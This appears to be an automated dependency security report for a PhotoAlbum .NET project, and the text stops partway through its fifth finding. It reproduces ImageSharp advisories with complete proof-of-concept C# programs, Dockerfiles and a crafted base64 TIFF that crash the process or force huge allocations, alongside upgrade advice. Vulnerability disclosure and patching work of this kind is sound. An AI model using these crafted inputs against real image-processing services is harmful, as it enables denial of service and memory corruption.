# Security Assessment Report

**Generated:** 2026-10-27T01:30:22.033597Z

**Minimum CVE severity included:** medium

## Summary

| Metric | Count |
|--------|-------|
| Total Findings | 10 |
| CVE Vulnerabilities | 6 |
| CWE Vulnerabilities | 4 |
| Total Rules Assessed | 59 |
| Rules Passed | 55 |

### By Severity

| Severity | Count |
|----------|-------|
| mandatory | 5 |
| optional | 4 |
| potential | 1 |

## CVE Findings (Dependency Vulnerabilities)

### CVE-2026-106110: ImageSharp: TIFF CCITT T4 encoder can write past its compressed output buffer
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106110](https://github.com/advisories/GHSA-j9gm-c75j-xc9q): ImageSharp: TIFF CCITT T4 encoder can write past its compressed output buffer

### Summary

ImageSharp's TIFF CCITT Group 3 (T4) encoder can write beyond its allocated compressed-data buffer when encoding narrow 1-bit images. The unchecked writes can corrupt process memory and terminate the process.

This report concerns only the T4 `CcittGroup3Fax` encoder path. It replaces the prior, unrelated ICC content.

### Affected package and versions

- Package: `SixLabors.ImageSharp` (NuGet)
- Affected range: `>= 2.0.0, <= 4.1.1`
- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.

The T4 encoder and its undersized buffer calculation first shipped in v2.0.0. The narrow-image exploit terminates published v2.0.0 and v4.1.1 while the same-height 64-pixel control succeeds on both. Every release through v4.1.1 retains the vulnerable allocation and unchecked bit-write structure.
### Preconditions and impact

The affected path is reached when the application encodes 1-bit image data with `TiffCompression.CcittGroup3Fax`. This can happen when an application explicitly selects `TiffEncoder.BitsPerPixel = Bit1` and `TiffEncoder.Compression = CcittGroup3Fax`. It can also occur when an application decodes a TIFF and re-encodes it using the default `TiffEncoder`, because ImageSharp retains TIFF frame metadata including the compression and bit depth.

`TiffCompressorFactory` creates `T4BitCompressor` for `CcittGroup3Fax`. `TiffCcittCompressor.Initialize` allocates `Width * rowsPerStrip` bytes, but non-modified T4 writes a 12-bit EOL before row data and an additional 12-bit EOL per row. `WriteCode` calls `BitWriterUtils.WriteBit` and `WriteZeroBit`, both of which use `Unsafe.Add` without a capacity check. Thus the encoded bit stream can exceed the allocated span.

A 1-pixel-wide, 2000-row alternating bilevel image caused a fatal `System.AccessViolationException` during T4 compression. This is a memory-corruption and availability issue for applications that expose this encoding flow to attacker-controlled input.

### Tested environment

- Package binary: NuGet `SixLabors.ImageSharp` **4.1.1**
- Target framework: `net8.0`
- Runtime: .NET 8.0.30; SDK 8.0.424
- Operating system: Debian GNU/Linux 12 (bookworm), Linux arm64, Docker

No active exploitation is known.

### Reproduction

In a `net8.0` project that references the published `SixLabors.ImageSharp` 4.1.1 binary, save the following as `Program.cs`. Run `dotnet run -- exploit 2000` for the trigger and `dotnet run -- control 2000` for the control.

```csharp
using System;
using System.IO;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Formats.Tiff;
using SixLabors.ImageSharp.Formats.Tiff.Constants;
using SixLabors.ImageSharp.PixelFormats;

string mode = args.Length > 0 ? args[0] : "exploit";
int width = mode == "control" ? 64 : 1;
int height = args.Length > 1 ? int.Parse(args[1]) : 2000;

Console.WriteLine($"mode={mode} width={width} height={height}");
using var image = new Image<L8>(width, height);
for (int y = 0; y < image.Height; y++)
    for (int x = 0; x < image.Width; x++)
        image[x, y] = new L8((byte)(((x + y) & 1) == 0 ? 255 : 0));

var metadata = image.Frames.RootFrame.Metadata.GetTiffMetadata();
metadata.BitsPerPixel = TiffBitsPerPixel.Bit1;
metadata.Compression = TiffCompression.CcittGroup3Fax;

using var output = new MemoryStream();
image.Save(output, new TiffEncoder());
Console.WriteLine($"Encoded OK: {output.Length} bytes");
```

Against the published 4.1.1 package, this produced:

```text
mode=exploit width=1 height=2000
Fatal error. System.AccessViolationException: Attempted to read or write protected memory.
  at ...TiffCcittCompressor.GetWhiteTermCode(...)
  at ...T4BitCompressor.CompressStrip(...)
```

A 64-pixel-wide, 2000-row control using the same Group 3 metadata completed successfully:

```text
mode=control width=64 height=2000
Encoded OK: 76230 bytes
```

The direct public configuration path also triggers with:

```csharp
new TiffEncoder
{
    BitsPerPixel = TiffBitsPerPixel.Bit1,
    Compression = TiffCompression.CcittGroup3Fax
};
```

Severity: HIGH

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 2.0.0, < 3.2.0 (first patched: 3.2.0); >= 4.0.0, < 4.1.2 (first patched: 4.1.2).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

### CVE-2026-106113: ImageSharp: HistogramEqualization uses an unvalidated luminance as an unchecked histogram index
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106113](https://github.com/advisories/GHSA-j3p4-wp97-rph4): ImageSharp: HistogramEqualization uses an unvalidated luminance as an unchecked histogram index

### Summary

`SixLabors.ImageSharp` can terminate a process when an application decodes
an attacker-supplied 32-bit floating-point TIFF as `Image<HalfVector4>` and applies
`HistogramEqualization()`. An IEEE positive-infinity TIFF sample reaches a non-finite or otherwise out-of-range
`HalfVector4` component, depending on the release. The histogram equalization path derives a luminance-based
histogram index without validating that result, reaching an unsafe out-of-range
access.

This report covers `HistogramEqualization` only. It does not claim Adaptive
Histogram Equalization or AutoLevel behavior.

### Affected package and versions

- Package: `SixLabors.ImageSharp` (NuGet)
- Affected range: `>= 2.0.0, <= 4.1.1`
- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.

TIFF decoding first shipped in v2.0.0; v1.0.4 has no TIFF decoder. The unsafe luminance-derived histogram index is present from v2.0.0 through v4.1.1. The positive-infinity TIFF PoC terminates published 2.0.0, 3.1.12, 4.0.0, and 4.1.1 with `AccessViolationException`, while the finite `0.5` control completes on each tested release.
### Details

[`ColorNumerics.GetBT709Luminance`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Common/Helpers/ColorNumerics.cs#L24-L30) can produce a luminance that does not map to a valid histogram index. [`GrayscaleLevelsRowOperation.Invoke`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Processing/Processors/Normalization/GrayscaleLevelsRowOperation%7BTPixel%7D.cs#L47-L62) then uses that result as an unchecked `Unsafe.Add` offset into the histogram.

The reproduction reaches this code through the public `HistogramEqualization()` extension. It does not test or claim the Adaptive Histogram Equalization or `AutoLevel` paths.

### Tested environment

The reproduction uses the DLL in the published NuGet 4.1.1 package:

```text
SixLabors.ImageSharp.dll SHA-256:
c50231b527153cd9103acf03536a743958b3d892cc98cf9c05c9bcedef63ba0f
Runtime: .NET 8.0.30 (linux-arm64)
SDK: 8.0.424
OS: Debian GNU/Linux 12 (bookworm), Docker
```

### Reproduction

Build the supplied Dockerfile and run the exploit. The harness creates a valid
8x1 uncompressed, 32-bit IEEE floating-point TIFF whose samples are positive infinity,
decodes it through the public API, and invokes `HistogramEqualization()`.

Observed result:

```text
mode=exploit tiffBytes=166 sample=Infinity
decoded=8x1 pixel=<Infinity, Infinity, Infinity, 1>
Fatal error. System.AccessViolationException: Attempted to read or write protected memory.
...
at SixLabors.ImageSharp.Processing.Processors.Normalization.GrayscaleLevelsRowOperation`1.Invoke
...
at SixLabors.ImageSharp.Processing.HistogramEqualizationExtensions.HistogramEqualization
Docker exit status: 133
```

The control is identical except samples are `0.5`:

```text
mode=control tiffBytes=166 sample=0.5
decoded=8x1 pixel=<0.5, 0.5, 0.5, 1>
completed
Docker exit status: 0
```

When the same exploit binary was invoked through a shell inside the container,
the shell printed `Aborted` and reported status 134. The direct `docker run`
result above is the result for the supplied Docker commands.

No active exploitation is known.


### Complete PoC files

Program.cs:

```csharp
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.PixelFormats;
using SixLabors.ImageSharp.Processing;

static class Program
{
    private static void AddEntry(List<byte> ifd, ushort tag, ushort type, uint count, uint value)
    {
        ifd.AddRange(BitConverter.GetBytes(tag));
        ifd.AddRange(BitConverter.GetBytes(type));
        ifd.AddRange(BitConverter.GetBytes(count));
        ifd.AddRange(BitConverter.GetBytes(value));
    }

    // Valid, uncompressed 8x1 grayscale TIFF containing 32-bit IEEE float samples.
    private static byte[] BuildTiff(float sample)
    {
        const int width = 8;
        const int entries = 10;
        const int ifdOffset = 8;
        const int pixelOffset = ifdOffset + 2 + (entries * 12) + 4;
        List<byte> file = [0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00];
        List<byte> ifd = [];
        ifd.AddRange(BitConverter.GetBytes((ushort)entries));
        const ushort Short = 3, Long = 4;
        AddEntry(ifd, 256, Long, 1, width);             // ImageWidth
        AddEntry(ifd, 257, Long, 1, 1);                 // ImageLength
        AddEntry(ifd, 258, Short, 1, 32);               // BitsPerSample
        AddEntry(ifd, 259, Short, 1, 1);                // Compression = none
        AddEntry(ifd, 262, Short, 1, 1);                // Photometric = BlackIsZero
        AddEntry(ifd, 273, Long, 1, pixelOffset);       // StripOffsets
        AddEntry(ifd, 277, Short, 1, 1);                // SamplesPerPixel
        AddEntry(ifd, 278, Long, 1, 1);                 // RowsPerStrip
        AddEntry(ifd, 279, Long, 1, width * 4);         // StripByteCounts
        AddEntry(ifd, 339, Short, 1, 3);                // SampleFormat = IEEE float
        ifd.AddRange([0, 0, 0, 0]);
        file.AddRange(ifd);
        for (int i = 0; i < width; i++)
        {
            file.AddRange(BitConverter.GetBytes(sample));
        }

        return file.ToArray();
    }

    private static void Main(string[] args)
    {
        string mode = args.FirstOrDefault() ?? "exploit";
        float sample = mode == "control" ? 0.5F : float.PositiveInfinity;
        byte[] tiff = BuildTiff(sample);
        Console.Error.WriteLine($"mode={mode} tiffBytes={tiff.Length} sample={sample}");

        using Image<HalfVector4> image = Image.Load<HalfVector4>(tiff);
        Console.Error.WriteLine($"decoded={image.Width}x{image.Height} pixel={image[0, 0].ToScaledVector4()}");
        image.Mutate(x => x.HistogramEqualization());
        Console.Error.WriteLine("completed");
    }
}

```

Project file:

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <!-- Directly load the DLL packaged by the published NuGet 4.1.1 release. -->
  <ItemGroup>
    <Reference Include="SixLabors.ImageSharp">
      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>
    </Reference>
    <Reference Include="System.IO.Hashing">
      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>
    </Reference>
  </ItemGroup>
</Project>

```

Dockerfile:

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /work
COPY j3p4.csproj Program.cs ./
RUN printf '%s\n' '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="SixLabors.ImageSharp" Version="4.1.1" /></ItemGroup></Project>' > fetch.csproj \
    && dotnet restore fetch.csproj --nologo \
    && rm fetch.csproj \
    && dotnet build j3p4.csproj -c Release --nologo -v quiet
ENTRYPOINT ["dotnet", "/work/bin/Release/net8.0/j3p4.dll"]

```

Run:

```sh
docker build -t imagesharp-j3p4-poc .
docker run --rm imagesharp-j3p4-poc exploit
docker run --rm imagesharp-j3p4-poc control
```

Severity: HIGH

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 2.0.0, < 3.2.0 (first patched: 3.2.0); >= 4.0.0, < 4.1.2 (first patched: 4.1.2).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

### CVE-2026-106115: ImageSharp: TIFF CCITT T6 encoder writes beyond an undersized output buffer
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106115](https://github.com/advisories/GHSA-jjfr-hcj7-qf5w): ImageSharp: TIFF CCITT T6 encoder writes beyond an undersized output buffer

### Summary

The TIFF CCITT Group 4 (T6) encoder writes beyond its logical compressed-data buffer when encoding a 1-bit image. A valid 1×1 Group 4 TIFF decoded and re-encoded with the default `TiffEncoder` terminates the process with an unhandled exception.

### Affected package and versions

- Package: `SixLabors.ImageSharp` (NuGet)
- Affected range: `>= 2.1.0, <= 4.1.1`
- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.

The T6 compressor was introduced by commit `3c9eb470a07a15012c2a29ad84090dcc804a7975`, first released in v2.1.0, with the same `Width * rowsPerStrip` allocation and unchecked code writes. The 1×1 exploit terminates published v2.1.0 and v4.1.1; its uncompressed control succeeds. Source history shows no capacity fix through v4.1.1.
### Details

[`TiffCcittCompressor.Initialize`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/TiffCcittCompressor.cs#L527-L532) allocates `Width * rowsPerStrip` bytes. A 1×1 strip therefore receives one byte.

After encoding the row, [`T6BitCompressor.CompressStrip`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/T6BitCompressor.cs#L53-L131) appends two 12-bit EOFB codes. [`WriteCode`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Tiff/Compression/Compressors/TiffCcittCompressor.cs#L466-L479) writes those bits without checking the destination capacity. The final checked slice detects the oversized byte count and throws `ArgumentOutOfRangeException`, after the unchecked writes have exceeded the one-byte span.

The default TIFF encoder can inherit `CcittGroup4Fax` and 1-bit settings from decoded frame metadata. The reproduction uses that decode-and-re-encode path.

### Tested environment

- Published NuGet package: `SixLabors.ImageSharp` 4.1.1
- Target framework: `net8.0`
- .NET SDK: 8.0.424
- .NET runtime: 8.0.30
- Operating system: Debian GNU/Linux 12, ARM64, Docker

No active exploitation is known.

### Reproduction

Create a `net8.0` project referencing the published 4.1.1 assembly and use this `Program.cs`:

```csharp
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Formats.Tiff;
using SixLabors.ImageSharp.Formats.Tiff.Constants;

string mode = args.FirstOrDefault() ?? "exploit";
byte[] input = Convert.FromBase64String(
    "SUkqAAgAAAAJAAABAwABAAAAAQAAAAEBAwABAAAAAQAAAAIBAwABAAAAAQAAAAMBAwABAAAABAAAAAYBAwABAAAAAAAAABEBBAABAAAAegAAABUBAwABAAAAAQAAABYBBAABAAAAAQAAABcBBAABAAAABAAAAAAAAACACACA");

using Image image = Image.Load(input);
var metadata = image.Frames.RootFrame.Metadata.GetTiffMetadata();
Console.WriteLine($"ImageSharp={typeof(Image).Assembly.GetName().Version}");
Console.WriteLine($"mode={mode} decoded={image.Width}x{image.Height} compression={metadata.Compression} bits={metadata.BitsPerPixel}");

using var output = new MemoryStream();
if (mode == "control")
{
    image.Save(output, new TiffEncoder { Compression = TiffCompression.None });
}
else
{
    image.Save(output, new TiffEncoder());
}

Console.WriteLine($"encoded=True bytes={output.Length}");
```

Run:

```text
dotnet run -- exploit
dotnet run -- control
```

The exploit produced exit code 134:

```text
ImageSharp=4.0.0.0
mode=exploit decoded=1x1 compression=CcittGroup4Fax bits=Bit1
Unhandled exception. System.ArgumentOutOfRangeException: Specified argument was out of the range of valid values.
   at SixLabors.ImageSharp.Formats.Tiff.Compression.Compressors.TiffCcittCompressor.CompressStrip(Span`1 rows, Int32 height)
```

The control completed with exit code 0:

```text
ImageSharp=4.0.0.0
mode=control decoded=1x1 compression=CcittGroup4Fax bits=Bit1
encoded=True bytes=212
```

### Impact

One attacker-supplied Group 4 TIFF can select this unsafe encoder path when an application decodes it and re-encodes it with inherited TIFF metadata. The demonstrated result is an unhandled exception and process termination in the reproduction. The report is limited to the T6 encoder path.

Severity: HIGH

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 2.1.0, < 3.2.0 (first patched: 3.2.0); >= 4.0.0, < 4.1.2 (first patched: 4.1.2).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

### CVE-2026-106118: ImageSharp: Tiled fax TIFF: tile buffer sized by TileWidth but fax decompressor writes scanlines of ImageWidth — heap OOB write
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106118](https://github.com/advisories/GHSA-v76p-62qx-wwq2): ImageSharp: Tiled fax TIFF: tile buffer sized by TileWidth but fax decompressor writes scanlines of ImageWidth — heap OOB write

## Summary

When decoding a tiled TIFF with fax compression (T4/T6/MH), `DecodeTilesChunky` allocates each tile buffer from **TileWidth** (`ceil(TileWidth*bpp/8)*TileLength` bytes) but constructs the fax decompressor with **frame.Width**: `TiffDecompressorsFactory` ignores the `isTiled/tileWidth/tileHeight` parameters entirely. The T4/T6/MH decompressors treat the full image width as the scanline length and advance (and really write, via read-modify-write bit ops) `frame.Width` bits per row, with no bounds check against the tile buffer. The very first tile therefore writes linearly out of bounds — about `ImageWidth/8` bytes per row × TileLength rows into a `TileWidth`-sized buffer. With ImageWidth=4,000,000, TileWidth=16, TileLength=16 this writes ~2 MB past a 32-byte buffer and kills the process deterministically; a T6 all-white variant advances the bit offset by >512 MB silently, showing an alarm-free heap-corruption window for the same defect. A crafted file fully controls the OOB length per tile and works with perfectly legal per-row run codes (no overlong runs needed).

Verified at commit `5cd4d0d26a82a9549f297a237aea9cf665bddff8` (main; latest release v4.1.0, the supported major).

## Details

Root cause: a size mismatch between tile buffer allocation and decompressor width, because the factory drops the tile parameters.

- Allocation: [TiffDecoderCore.cs#L792-L794](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/TiffDecoderCore.cs#L792-L794) — `bytesPerTileRow = RoundUpToMultipleOfEight(tileWidth*bitsPerPixel)`; tile buffer = `bytesPerTileRow*tileLength` bytes (32 bytes in the PoC)
- Mismatch: [TiffDecoderCore.cs#L797](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/TiffDecoderCore.cs#L797) — `CreateDecompressor<TPixel>(frame.Width, ..., isTiled: true, tileWidth, tileLength)` passes the full frame width
- Factory drops tile params: [TiffDecompressorsFactory.cs#L56-L64](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/TiffDecompressorsFactory.cs#L56-L64) — T4/T6/MH decompressors receive only `width` (= frame.Width); `isTiled/tileWidth/tileHeight` ignored
- OOB write sink: [T4TiffCompression.cs#L69-L119](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/Decompressors/T4TiffCompression.cs#L69-L119), `T6TiffCompression.cs#L76-L108` — per-row advance of `this.width` bits via `BitWriterUtils.WriteBits` with no buffer-length check ([BitWriterUtils.cs#L51](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/BitWriterUtils.cs#L51)); note `TiffDecoderCore.cs:829-831` later reads the buffer in `bytesPerTileRow` strides, confirming the protocol expects tile-width rows

Attack surface: `Image.Load(stream)` on an attacker-supplied tiled TIFF (`TiffDecoderCore.DecodeImageWithTiles` → `DecodeTilesChunky`). Default configuration; only requirement is a standard tiled TIFF header (TileWidth=16, TileLength=16) + Compression=3 (T4; T6 also constructible).

**Suggested remediation:**
1. Short-term: when `isTiled`, construct the T4/T6/MH decompressor with `tileWidth` (not frame width), or clip row writes to the caller-provided buffer length.
2. Root fix: bound the write side of `BitWriterUtils` (pass remaining bits), and validate every fax row advance against buffer capacity on both tiled and strip paths.
3. Regression tests: Compression=2/3/4 × tiled with TileWidth < ImageWidth, including a T6 black-pixel row (forces real `WriteBit`).

## PoC

Full PoC posted as the first comment below: `Program.cs` (driver), `poc-tiled-t4.tif` (crafted file, ~9.8 KB, base64 inline), README.

1. Build a small console project referencing `src/ImageSharp/ImageSharp.csproj` and run it against the crafted file (or call `Image.Load` on it from any host).
2. Observed with ImageWidth=4,000,000, TileWidth=16, TileLength=16, T4 with 400 makeup codes + EOL per row:

   ```
   tile payload 9642 bytes; rows write ~2,048,000 bytes into a 32-byte buffer
   Fatal error. System.AccessViolationException: Attempted to read or write protected memory.
      at SixLabors.ImageSharp.Formats.Tiff.Compression.BitWriterUtils.WriteBits(Span`1<Byte>, IntPtr, IntPtr, Byte)
      at ...T4TiffCompression.WritePixelRun(...)
      at ...T4TiffCompression.Decompress(...)
   Aborted (core dumped); exit=134
   ```

3. Controls: the same file with Compression=None decodes normally (container is fine); a T6 all-white-rows variant advances >512 MB of bit offset without a real write (silent corruption window) before tripping on a directory-level TileOffsets count check.

## Impact

- **What it is:** out-of-bounds write (CWE-787). For any service decoding untrusted tiled TIFFs: remote, default-configuration, deterministic process crash (DoS), plus a heap OOB write whose per-tile length and row width are attacker-tunable — a potential code-execution surface. This is a vulnerability in the library itself, in scope of your SECURITY.md.
- **Who is impacted:** applications decoding untrusted TIFF with SixLabors.ImageSharp at the current major (verified on main past v4.1.0); tiled + fax-compressed files are the trigger, which ordinary TIFF writers can produce.

---

---

Reported by **Kimi Security Team** (bug-report@moonshot.ai).

Severity: HIGH

Affected dependency: SixLabors.ImageSharp 3.1.11 (declared at PhotoAlbum/PhotoAlbum.csproj:16).
Vulnerable ranges and first patched versions: >= 3.0.0, < 3.2.0 (first patched: 3.2.0); >= 4.0.0, < 4.1.1 (first patched: 4.1.1).

Recommended fix: upgrade SixLabors.ImageSharp to 3.2.0 or later.

### CVE-2026-106114: ImageSharp: ICC CLUT parsing allocates from unvalidated channel and grid dimensions
- **Severity:** optional
- **Story Points:** 1
- **Files:** PhotoAlbum/PhotoAlbum.csproj:16

[CVE-2026-106114](https://github.com/advisories/GHSA-gwg2-r3hj-4w44): ImageSharp: ICC CLUT parsing allocates from unvalidated channel and grid dimensions

### Summary

A malformed embedded ICC profile can make ImageSharp allocate memory from attacker-controlled CLUT channel and grid dimensions before verifying that the declared CLUT values are present.

In published v1 through v3 packages, the public lazy ICC parser allocates approximately 115 MB from the 200-byte test profile before rejecting the truncated tag. In published v4 packages, decoding with ICC conversion enabled requests an 860,934,420-byte managed float array from the same profile.

### Affected package and versions

- Package: `SixLabors.ImageSharp` (NuGet)
- Affected range: `>= 1.0.0-beta0001, <= 4.1.1`
- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.

The parser defect is present from the first published NuGet prerelease, `1.0.0-beta0001`, through the latest published release, 4.1.1. The automatic `Image.Load` conversion path used by the main PoC exists in `>= 4.0.0, <= 4.1.1`; earlier versions expose the same parser defect through the public `IccProfile.Entries` accessor.
### Details

The reproduced profile has an `A2B0` multi-process-elements (`mpet`) tag with a
`clut` element declaring 15 input channels, 15 output channels, and three grid
points per input channel. [`ReadClutF32`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Metadata/Profiles/ICC/DataReader/IccDataReader.Lut.cs#L139-L162)
computes `3^15 * 15` and allocates that many floats before reading any CLUT
values or verifying that the tag has enough remaining data. The supplied
200-byte profile ends immediately after the CLUT grid descriptor.

In v4, the path is reached when an application decodes an embedded ICC profile using
`DecoderOptions.ColorProfileHandling = ColorProfileHandling.Convert`. The
default setting, `Preserve`, does not parse the profile for conversion.

In v1 through v3, `ReadClutF32` uses a jagged representation. Loading an ICC-bearing JPEG and then accessing `decoded.Metadata.IccProfile.Entries` reaches the public lazy parser. The malformed profile allocates the `3^15`-entry outer array before the missing CLUT values are detected.

### Reproduction environment and result

The supplied automatic-conversion exploit and control were run against the published NuGet 4.1.1
`net8.0` DLL in Docker on Debian 12 / Linux arm64 with .NET SDK 8.0.424 and
.NET runtime 8.0.30. The same conversion fixture was run against published 4.0.0 and 4.1.0 with the same result.

Published 1.0.0, 2.0.0, 2.1.13, 3.0.0, and 3.1.12 were tested through public JPEG decode followed by `IccProfile.Entries`; each allocated approximately 114.9 MB, skipped the malformed tag, and exited normally. The published `1.0.0-beta0001` public `IccProfile(bytes).Entries` path allocated 114,813,528 bytes before a catchable managed bounds exception.

One exploit decode increased `GC.GetTotalAllocatedBytes(true)` by approximately
861.5 million bytes, then returned
`InvalidIccProfileException: Invalid conversion method`.
The reader catches the truncated-tag error and drops that tag. The identical
input with `ColorProfileHandling.Preserve` completed successfully with roughly
0.5 million allocated bytes in the harness.

One complete exploit run produced:

```text
mode=exploit profile_bytes=200 requested_float_array=215233605 requested_bytes=860934420
imagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll
imagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f
observed_exception=SixLabors.ImageSharp.Metadata.Profiles.Icc.InvalidIccProfileException: Invalid conversion method.
managed_bytes_allocated=861476416
Docker exit status: 0
```

The control from the same image produced:

```text
mode=control profile_bytes=200 requested_float_array=215233605 requested_bytes=860934420
imagesharp_assembly=/work/bin/Release/net8.0/SixLabors.ImageSharp.dll
imagesharp_version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f
decoded=1x1 icc_present=True
managed_bytes_allocated=511888
Docker exit status: 0
```

The exact allocation counter includes runtime allocations and varies slightly
between processes; the requested CLUT array itself is 860,934,420 bytes.

No active exploitation is known.

### Impact

This report demonstrates a large attacker-controlled transient allocation in
the ICC conversion path. It does not demonstrate unhandled process termination:
allocation failure is caught while parsing the malformed tag, so the impact
should be limited to memory pressure / input-validation failure unless a
reproduction demonstrates a stronger result.


### Complete PoC files

Program.cs:

```csharp
using System;
using System.Buffers.Binary;
using System.IO;
using System.Reflection;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Formats;
using SixLabors.ImageSharp.Formats.Png;
using SixLabors.ImageSharp.Metadata.Profiles.Icc;
using SixLabors.ImageSharp.PixelFormats;

static class Program
{
    private const int RequestedFloats = 215233605; // 3^15 * 15
    private const int RequestedBytes = RequestedFloats * sizeof(float);

    private static void U32(byte[] bytes, int offset, uint value) => BinaryPrimitives.WriteUInt32BigEndian(bytes.AsSpan(offset, 4), value);
    private static void U16(byte[] bytes, int offset, ushort value) => BinaryPrimitives.WriteUInt16BigEndian(bytes.AsSpan(offset, 2), value);
    private static void Ascii(byte[] bytes, int offset, string value) { for (int i = 0; i < value.Length; i++) bytes[offset + i] = (byte)value[i]; }

    // ICC v4 RGB profile containing an A2B0 mpet tag whose CLUT is deliberately
    // truncated after its grid descriptor. ReadClutF32 still sizes float[] from
    // the 15 untrusted input/output channels and the grid value of three.
    private static byte[] BuildTruncatedProfile()
    {
        const int tagOffset = 144;
        const int elementOffset = 168;
        byte[] profile = new byte[200];
        U32(profile, 0, (uint)profile.Length);
        Ascii(profile, 4, "test");
        U32(profile, 8, 0x04000000);
        U32(profile, 12, 0x6D6E7472); // display device
        U32(profile, 16, 0x52474220); // RGB
        U32(profile, 20, 0x58595A20); // XYZ
        Ascii(profile, 36, "acsp");
        U32(profile, 128, 1);
        U32(profile, 132, 0x41324230); // A2B0
        U32(profile, 136, tagOffset);
        U32(profile, 140, 56);
        U32(profile, tagOffset, 0x6D706574); // mpet
        U16(profile, tagOffset + 8, 0);
        U16(profile, tagOffset + 10, 0);
        U32(profile, tagOffset + 12, 1);
        U32(profile, tagOffset + 16, 24); // element offset relative to tag start
        U32(profile, tagOffset + 20, 32);
        U32(profile, elementOffset, 0x636C7574); // clut
        U16(profile, elementOffset + 4, 15);
        U16(profile, elementOffset + 6, 15);
        for (int i = 0; i < 15; i++) profile[elementOffset + 8 + i] = 3;
        return profile;
    }

    private static byte[] BuildPng(byte[] icc)
    {
        using var image = new Image<Rgba32>(1, 1);
        image.Metadata.IccProfile = new IccProfile(icc);
        using var output = new MemoryStream();
        image.Save(output, new PngEncoder());
        return output.ToArray();
    }

    public static int Main(string[] args)
    {
        string mode = args.Length == 1 ? args[0] : "exploit";
        if (mode is not ("exploit" or "control")) throw new ArgumentException("mode must be exploit or control");
        Console.WriteLine($"mode={mode} profile_bytes=200 requested_float_array={RequestedFloats} requested_bytes={RequestedBytes}");
        Console.WriteLine($"imagesharp_assembly={typeof(Image).Assembly.Location}");
        Console.WriteLine($"imagesharp_version={typeof(Image).Assembly.GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion}");
        long before = GC.GetTotalAllocatedBytes(true);
        try
        {
            byte[] png = BuildPng(BuildTruncatedProfile());
            var options = new DecoderOptions
            {
                ColorProfileHandling = mode == "exploit" ? ColorProfileHandling.Convert : ColorProfileHandling.Preserve
            };
            using Image decoded = Image.Load(options, png);
            Console.WriteLine($"decoded={decoded.Width}x{decoded.Height} icc_present={decoded.Metadata.IccProfile is not null}");
        }
        catch (Exception exception)
        {
            Console.WriteLine($"observed_exception={exception.GetType().FullName}: {exception.Message}");
        }
        Console.WriteLine($"managed_bytes_allocated={GC.GetTotalAllocatedBytes(true) - before}");
        return 0;
    }
}

```

Project file:

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
